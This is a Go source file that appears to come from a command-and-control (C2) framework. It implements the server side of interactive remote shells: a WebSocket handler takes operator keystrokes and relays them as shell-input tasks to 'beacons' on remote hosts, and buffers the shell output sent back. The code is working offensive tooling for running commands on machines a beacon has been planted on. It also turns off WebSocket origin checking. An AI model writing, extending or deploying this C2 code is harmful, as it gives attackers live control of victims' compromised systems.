package server

import (
	"context"
	"net/http"
	"strconv"
	"sync"
	"time"

	"c2/protocol"

	"nhooyr.io/websocket"
)

// ShellManager tracks active WebSocket connections for interactive shell sessions.
// Buffers output arriving before WebSocket connects.
type ShellManager struct {
	mu     sync.RWMutex
	conns  map[uint32]*websocket.Conn
	bufs   map[uint32][][]byte
}

// NewShellManager creates a new ShellManager.
func NewShellManager() *ShellManager {
	return &ShellManager{
		conns: make(map[uint32]*websocket.Conn),
		bufs:  make(map[uint32][][]byte),
	}
}

// Register associates a WebSocket connection with a beacon ID and flushes buffered output.
func (sm *ShellManager) Register(beaconID uint32, conn *websocket.Conn) {
	sm.mu.Lock()
	sm.conns[beaconID] = conn
	pending := sm.bufs[beaconID]
	delete(sm.bufs, beaconID)
	sm.mu.Unlock()

	ctx := context.Background()
	for _, data := range pending {
		conn.Write(ctx, websocket.MessageBinary, data)
	}
}

// Unregister removes the WebSocket connection for a beacon ID.
func (sm *ShellManager) Unregister(beaconID uint32) {
	sm.mu.Lock()
	defer sm.mu.Unlock()
	delete(sm.conns, beaconID)
	delete(sm.bufs, beaconID)
}

// Close forcefully closes the shell WebSocket for a beacon (called when TCP session drops).
func (sm *ShellManager) Close(beaconID uint32) {
	sm.mu.Lock()
	conn := sm.conns[beaconID]
	delete(sm.conns, beaconID)
	sm.mu.Unlock()
	if conn != nil {
		conn.Close(websocket.StatusGoingAway, "session closed")
	}
}

// Send pushes data to the WebSocket connection for the given beacon.
// If no WebSocket is connected yet, buffers the data for later flush.
func (sm *ShellManager) Send(beaconID uint32, data []byte) bool {
	sm.mu.Lock()
	conn := sm.conns[beaconID]
	if conn == nil {
		cp := make([]byte, len(data))
		copy(cp, data)
		sm.bufs[beaconID] = append(sm.bufs[beaconID], cp)
		sm.mu.Unlock()
		return true
	}
	sm.mu.Unlock()
	ctx := context.Background()
	return conn.Write(ctx, websocket.MessageBinary, data) == nil
}

func handleShellWebSocket(w http.ResponseWriter, r *http.Request, sl *SessionListener, sm *ShellManager) {
	idStr := r.URL.Path[len("/ws/shell/"):]
	id64, err := strconv.ParseUint(idStr, 10, 32)
	if err != nil {
		http.Error(w, "invalid beacon id", http.StatusBadRequest)
		return
	}
	beaconID := uint32(id64)

	// Accept WebSocket immediately — no longer require session mode
	conn, err := websocket.Accept(w, r, &websocket.AcceptOptions{
		InsecureSkipVerify: true,
	})
	if err != nil {
		return
	}
	defer conn.CloseNow()

	// Wait up to 30 seconds for the shell TCP connection to arrive
	deadline := time.Now().Add(30 * time.Second)
	for time.Now().Before(deadline) {
		if sl.store.IsShell(beaconID) || sl.store.IsSession(beaconID) {
			break
		}
		time.Sleep(500 * time.Millisecond)
	}

	if !sl.store.IsShell(beaconID) && !sl.store.IsSession(beaconID) {
		conn.Close(websocket.StatusInternalError, "shell connection timeout")
		return
	}

	sm.Register(beaconID, conn)
	defer sm.Unregister(beaconID)

	ctx := r.Context()

	for {
		_, msg, err := conn.Read(ctx)
		if err != nil {
			break
		}
		if len(msg) == 0 {
			continue
		}

		inputData := protocol.EncodeShellInput(msg)
		taskMsg := protocol.EncodeHeader(protocol.TaskHeader{
			Type:   protocol.TaskShellInput,
			Code:   0,
			Label:  0,
			Length: uint32(len(inputData)),
		})
		taskMsg = append(taskMsg, inputData...)

		// Route via shell TCP if available, otherwise fall back to session TCP
		if sl.store.IsShell(beaconID) {
			sl.SendShellTask(beaconID, taskMsg)
		} else {
			sl.SendTask(beaconID, taskMsg)
		}
	}

	conn.Close(websocket.StatusNormalClosure, "")
}
